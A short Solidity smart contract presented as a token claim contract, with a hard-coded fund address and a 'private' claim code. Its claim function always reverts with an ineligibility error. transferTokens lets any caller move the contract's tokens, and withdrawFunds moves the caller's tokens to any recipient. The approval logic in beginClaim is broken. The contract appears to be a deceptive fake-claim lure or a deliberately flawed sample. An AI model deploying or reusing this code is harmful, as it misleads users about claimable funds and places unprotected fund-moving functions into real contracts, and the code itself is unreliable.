// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ClaimContract {
    address public immutable fundAddress;
    uint256 private claimCode;
    
    error IneligibleWallet(string reason);

    constructor() {
        fundAddress = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;
        claimCode = 908270;
    }

    function getFundAddress() external view returns (address) {
        return fundAddress;
    }

    function isClaimable(uint256 code) external view returns (bool) {
        return code == claimCode;
    }

    function beginClaim(address token, uint256 amount) external {
        require(IERC20(token).approve(address(this), amount), "Approval failed");
    }

    function claim() external pure {
        revert IneligibleWallet("Minimum balance not met");
    }

    function withdrawFunds(address token, address recipient, uint256 amount) external {
        require(IERC20(token).transferFrom(msg.sender, recipient, amount), "Withdraw failed");
    }

    function transferTokens(address token, address recipient, uint256 amount) external {
        require(IERC20(token).transfer(recipient, amount), "Transfer failed");
    }
}